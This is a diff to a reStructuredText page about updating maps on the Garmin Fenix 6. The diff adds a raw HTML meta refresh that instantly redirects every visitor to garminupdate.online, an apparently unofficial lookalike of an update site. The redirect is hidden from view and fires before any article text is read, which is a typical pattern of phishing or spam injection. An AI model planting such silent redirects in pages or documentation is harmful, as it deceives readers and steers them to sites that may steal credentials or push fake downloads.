@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Fenix 6 Map Update: Keep Your Maps Accurate for Outdoor Adventures
 =============================================================
 
